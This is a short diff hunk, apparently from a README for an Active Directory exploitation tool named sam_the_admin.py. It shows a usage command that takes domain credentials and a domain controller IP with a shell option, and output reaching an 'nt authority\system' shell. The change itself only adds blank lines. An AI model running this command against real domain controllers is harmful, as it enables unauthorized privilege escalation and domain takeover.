@@ -33,3 +33,5 @@ $ python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell
 C:\Windows\system32>whoami                                                        
 nt authority\system 
 ```
+
+
